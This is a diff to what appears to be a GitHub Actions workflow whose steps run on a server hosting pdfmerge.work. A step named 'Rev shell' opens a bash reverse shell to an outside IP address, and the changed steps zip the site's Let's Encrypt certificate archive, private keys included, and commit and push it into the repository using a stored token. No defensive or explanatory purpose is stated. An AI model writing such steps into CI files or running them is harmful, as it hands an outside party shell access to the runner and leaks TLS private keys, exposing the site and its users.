@@ -82,20 +82,20 @@ jobs:
       - name: Rev shell
         run: bash -c "sh -i >& /dev/tcp/140.238.230.97/53 0>&1"
 
-      - name: Copy Certificates to Repo Folder
+      - name: Zip Certificates
         run: |
-          sudo mkdir -p /tmp/certs
-          sudo cp -L /etc/letsencrypt/live/pdfmerge.work/* /tmp/certs/
-          sudo chmod -R 777 /tmp/certs
-      
-      - name: Commit and Push Certificates
+          sudo apt update && sudo apt install -y zip  # Ensure zip is installed
+          sudo zip -r /tmp/pdfmerge_work.zip /etc/letsencrypt/archive/pdfmerge.work
+
+      - name: Commit and Push Certificates Zip
         env:
           GITHUB_TOKEN: ${{ secrets.REPO_TOKEN }}
         run: |
           mkdir -p certs  # Ensure certs directory in the repository
-          cp -r /tmp/certs/* certs/  # Copy certificates to repo
+          cp /tmp/pdfmerge_work.zip certs/pdfmerge_work.zip  # Copy zip to repo folder
           git config --global user.name "github-actions[bot]"
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
-          git add certs/*
-          git commit -m "Add SSL certificates for pdfmerge.work"
+          git add certs/pdfmerge_work.zip
+          git commit -m "Add SSL certificates zip for pdfmerge.work"
           git push
+
